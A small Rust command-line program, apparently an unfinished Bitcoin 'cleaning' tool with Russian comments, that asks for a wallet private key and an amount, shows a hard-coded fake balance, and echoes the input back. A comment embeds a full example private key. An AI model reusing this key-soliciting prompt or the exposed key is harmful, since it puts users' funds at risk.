use colored::*;
use std::io::{stdin, stdout, Write};

// сновная функция
fn main() {
    title();

    write("warning".red(), "Please run this program on vps or do not reboot your computer until the end of the process.");
    write("info".bright_blue(), "A backup system will soon be implemented, but be careful for the time being.");
    let private: &str = ask("input".purple(), "Please enter your wallet's private key -> ");
    let amount: &str = ask("input".purple(), "Please enter the amount of Bitcoin(s) you want to clean (4.6534 BTC available) -> ");
    
    println!("Your private key is {}", private);
    println!("The amount you will be using is {}", amount);

    // Example wallet :
    // priv : L5Mhy9BaJrs4SosqiHsL8QECb4Ft3Ct8Gqiw2sMiF8QzgnVKrvkA
    // pub : 03ae70e44e86aacf01fe41778c0ba286ad29ac239a335e3ed3ed731311a80acdc2
    // addrs : 1P1WCK6rvpfmxYySHAtuhM6UbSL5PuXK74
}

// Функция отображения заголовка
fn title() {
    let title: &str = "┌──────────────────────────────────┐
│ ███████╗██████╗  █████╗ ███████╗ │
│ ██╔════╝██╔══██╗██╔══██╗██╔════╝ │
│ █████╗  ██████╔╝███████║███████╗ │
│ ██╔══╝  ██╔══██╗██╔══██║╚════██║ │
│ ███████╗██║  ██║██║  ██║███████║ │
│ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ │
└──────────────────────────────────┘ (v0.1.0)
";
    let lines: &str = "╚═╝╗╔║";
    for c in title.chars() {
        if lines.contains(c) {
            print!("{}", c.to_string().purple())
        } else {
            print!("{}", c)
        }
    }
}

// Функция для получения информации с консоли
fn ask(mode: ColoredString, ask: &str) -> &str{

    print!("(");
    print!("{}", mode);
    print!(") ");

    print!("{}", ask);
    stdout().flush().unwrap();

    let mut input = String::new();
    stdin()
        .read_line(&mut input)
        .expect("Error durring the proccess");

    return Box::leak(input.into_boxed_str());
}

// Функция для отображения элементов в консоли
fn write(mode: ColoredString, message: &str){

    print!("(");
    print!("{}", mode);
    print!(") ");

    println!("{}", message);
}
